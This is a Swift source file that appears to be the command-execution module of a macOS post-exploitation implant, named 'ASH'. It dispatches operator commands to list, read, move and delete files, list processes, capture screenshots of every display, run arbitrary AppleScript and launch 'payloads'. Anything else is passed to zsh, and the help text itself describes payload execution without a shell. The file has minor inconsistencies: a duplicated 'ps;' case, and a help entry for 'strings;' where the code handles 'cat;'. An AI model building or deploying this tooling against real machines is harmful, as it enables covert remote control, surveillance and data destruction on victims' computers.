import Foundation
import AppKit
extension Collection where Indices.Iterator.Element == Index {
    public subscript(safe index: Index) -> Element? {
        return (startIndex <= index && index < endIndex) ? self[index]: nil
    }
}
public struct ASH {
    public static func command(command:String) {
        let fileManager = FileManager.default
        func directoryPath(command:String) -> String {
            let path = fileManager.currentDirectoryPath
            let commandSplit = command.components(separatedBy: "; ")[safe: 1]
            if commandSplit != nil {
                let fullDirectory = path + "/" + commandSplit!
                return fullDirectory
            }
            else {
                return ""
            }
        }
        
        func filePath(command:String) -> String {
            let commandSplit = command.components(separatedBy: "; ")[safe: 1]
            if commandSplit != nil {
                let directory = commandSplit!
                return directory
            }
            else {
                return ""
            }
        }
        let progCall = command.split(separator: " ")
        if progCall.count > 0 {
            let progCallSplit = progCall[0]
            switch progCallSplit {
            case ("ls;"):
                let path = fileManager.currentDirectoryPath
                do {
                    var commandResult = "ls;\n"
                    let listPath = try fileManager.contentsOfDirectory(atPath: path)
                    print(path)
                    commandResult = commandResult + " " + path
                    for indFile in listPath {
                        print(indFile)
                    }
                }
                catch {
                    return
                }
            case ("cd;"):
                //Changes directory
                let directory = filePath(command: command)
                fileManager.changeCurrentDirectoryPath(directory)
            case ("cdr;"):
                //Go to the relative folder in this directory
                let fullDirectory = directoryPath(command: command)
                fileManager.changeCurrentDirectoryPath(fullDirectory)
            case ("mkdir;"):
                let fullDirectory = URL(fileURLWithPath: directoryPath(command: command))
                do {
                    try fileManager.createDirectory(at: fullDirectory, withIntermediateDirectories: false, attributes: nil)
                }
                catch {
                    return
                }
            case ("whoami;"):
                //Do Get username
                let username = NSUserName()
                print(username)
            case ("rm;"):
                //Delete a file
                let fullDirectory = URL(fileURLWithPath: directoryPath(command: command))
                do {
                    try fileManager.removeItem(at: fullDirectory)
                }
                catch {
                    return
                }
            case ("ps;"):
                //Will list all processes
                var commandResult = "ps;\n"
                for application in NSWorkspace.shared.runningApplications {
                    commandResult = commandResult + "\n" + String(application.localizedName!)
                    print(application.localizedName!)
                }
            case ("ps;"):
                //Will list all processes
                var commandResult = "ps;\n"
                for application in NSWorkspace.shared.runningApplications {
                    commandResult = commandResult + "\n" + String(application.localizedName!)
                    print(application.localizedName!)
                }
            case ("cat;"):
                let file = URL(fileURLWithPath: directoryPath(command: command))
                do {
                    let fileResults = try String(contentsOf: file, encoding: .utf8)
                    print(fileResults)
                }
                catch {
                    return
                }
            case ("mv;"):
                //Move a file.  This will delete the previous file
                let commandSplit = command.components(separatedBy: "; ")[safe: 1]
                if commandSplit != nil {
                    let directories = commandSplit!.split(separator: " ")
                    let origDir = directories[safe: 0]
                    let destDir = directories[safe: 1]
                    if origDir != nil && destDir != nil {
                        let origDirUrl = URL(fileURLWithPath: String(origDir!))
                        do {
                            try fileManager.copyItem(atPath: String(origDir!), toPath: String(destDir!))
                            try fileManager.removeItem(at: origDirUrl)
                        }
                        catch {
                            return
                        }
                    }
                }
            case ("cp;"):
                //Copy a file
                let commandSplit = command.components(separatedBy: "; ")[safe: 1]
                if commandSplit != nil {
                    let directories = commandSplit!.split(separator: " ")
                    let origDir = directories[safe: 0]
                    let destDir = directories[safe: 1]
                    if origDir != nil && destDir != nil {
                        do {
                            try fileManager.copyItem(atPath: String(origDir!), toPath: String(destDir!))
                        }
                        catch {
                            return
                        }
                    }
                }
            case ("screenshot;"):
                //Gets overall displays
                //Some bugs exist with this command
                //This will notify the user requesting permission to take pictures on 10.15+
                let path = command.components(separatedBy: "; ")[safe: 1]
                if path != nil {
                    var displayCount: UInt32 = 0
                    var displayList = CGGetActiveDisplayList(0, nil, &displayCount)
                    if (displayList == CGError.success) {
                        //Places all the displays into an object
                        let capacity = Int(displayCount)
                        let activeDisplay = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: capacity)
                        displayList = CGGetActiveDisplayList(displayCount, activeDisplay, &displayCount)
                        if (displayList == CGError.success) {
                            for singleDisplay in 1...displayCount {
                                let screenshotTime = Date().timeIntervalSince1970
                                let fullPath = path! + String(screenshotTime) + "_" + String(singleDisplay)
                                let filePath = URL(fileURLWithPath: fullPath + ".jpg")
                                let screenshot:CGImage = CGDisplayCreateImage(activeDisplay[Int(singleDisplay-1)])!
                                let bitmap = NSBitmapImageRep(cgImage: screenshot)
                                let screenshotData = bitmap.representation(using: .jpeg, properties: [:])!
                                do {
                                    try screenshotData.write(to: filePath, options: .atomic)
                                }
                                catch {
                                    print(error)
                                }
                            }
                        }
                    }
                }
            case ("osascript;"):
                let commandSplit = command.components(separatedBy: "; ")[safe: 1]
                if commandSplit != nil {
                    let source = commandSplit!
                    let scriptOutput = NSAppleScript(source: source)!
                    var scriptErr: NSDictionary?
                    scriptOutput.executeAndReturnError(&scriptErr)
                }
            case ("execute;"):
            //Will execute payloads, this typically works better when you're in the same directory as the destination payload
            let commandSplit = command.components(separatedBy: "; ")[safe: 1]
            if commandSplit != nil {
                do {
                    try NSWorkspace.shared.launchApplication(at: URL(fileURLWithPath: commandSplit!), options: .default, configuration: .init())
                }
                catch {
                    print(error)
                    return
                }
            }
            case ("man;"):
                let commandResult = """
                The following are commands ran as API calls:
                mkdir; --- Make a directory in your current directory.
                whoami; --- Print the current user.
                cdr; --- Go to a single folder from your current directory.
                cd; --- Change directories.
                ls; --- List the directory.
                ps; --- Will list all processes not limited to user processes.
                strings; --- This will print the contents of a file.
                mv; --- Perform a mv command to move files/folders.
                cp; --- Copy a file/folder.
                screenshot; <Destination> --- Take a snapshot of all screens. This will notify the user.
                osascript; <Code> --- This will run an Apple script.
                execute; <App to Run> --- This will execute a payload as an API call (no shell needed). Sometimes this works better if you're already in the directory of the payload.
                """
                print(commandResult)
            default:
                let shell = Process()
                let output = Pipe()
                shell.launchPath = "/bin/zsh"
                shell.standardOutput = output
                let newCommand = [command]
                shell.arguments = ["-c"] + newCommand
                shell.launch()
                shell.waitUntilExit()
                let data = output.fileHandleForReading.readDataToEndOfFile()
                let newOutput = String(data: data, encoding: .utf8)
                print(newOutput!)
            }
        }
        else {
            return
        }
    }
}
